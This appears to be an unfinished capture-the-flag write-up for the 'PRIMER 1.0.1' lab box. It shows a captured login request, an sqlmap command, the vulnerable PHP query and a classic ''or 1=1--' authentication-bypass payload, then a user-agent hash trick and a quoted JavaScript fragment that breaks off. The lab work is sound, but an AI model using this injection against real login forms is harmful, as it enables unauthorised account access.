# PRIMER: 1.0.1

### Challenge 0

First I was presented with a basic login box. The form asked for a username and password. I figured sql injection would be the way to go.

I decided to go the automated route, which was overkill. I opened up burpsuite and setup my proxy.

I then submitted some junk data leaving the request to look like:

~~~
POST /login.php HTTP/1.1
Host: 192.168.1.100
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Referer: http://192.168.1.100/
Connection: close
Upgrade-Insecure-Requests: 1

usr=admin&pw=password&commit=Login
~~~

I then threw this into sqlmap

```python sqlmap.py -r primer_request.txt -p usr --level 2```

The SQL request on the web server looked like this:

~~~
$query = sprintf("SELECT * FROM users WHERE usr='%s' AND pw='%s'", $usr, $pw);
~~~

Sqlmap ended up giving me a query that was

~~~
$query = "SELECT * FROM users WHERE usr ='-1'or 1=1-- AND pw='password'"
~~~

Which meant that my input looked like
~~~
usr="-1'or 1=1-- "&pw="password"
~~~

Moving on to the next challenge

### Challenge 1

I opened up the source code and there was a hint about a user agent identifier. It said:

~~~
This bot was looking for a Sosū User Agent Identifier she had cracked weeks ago, easy sauce, just a simple md5 hash of the first 7 digits of pi. It was basically common knowledge to the entities moving in these areas but obscurity does create a, albeit virtual, layer of security.
~~~

I googled shortly and found a quick article on changing my user agent: https://www.howtogeek.com/113439/how-to-change-your-browsers-user-agent-without-installing-any-extensions/

I then took the first 7 digits of pi and threw this into an md5 generator: 
3.141592 -> d483d00d07fcc80319d170ccf07fb5be

I set my user agent to the hash above and reloaded the page.

### Challenge 5

This challenge lists the directory in the html. 

Leading up to this challenge there are plenty of hints towards forking.

When we enter in the directory url we are prompted for what looks like a modified fork bomb. 

After following this path for a while I had no luck so I downloaded the source code for the page.

There was a javascript function doing:
~~~
<SCRIPT language="JavaScript">
  var X;

  if (X === null){window.location = "./_.php";}
  if (X.substr(2,7) == L){}

This misdirection could be fixed by typing any two characters and then "Ikdf076"
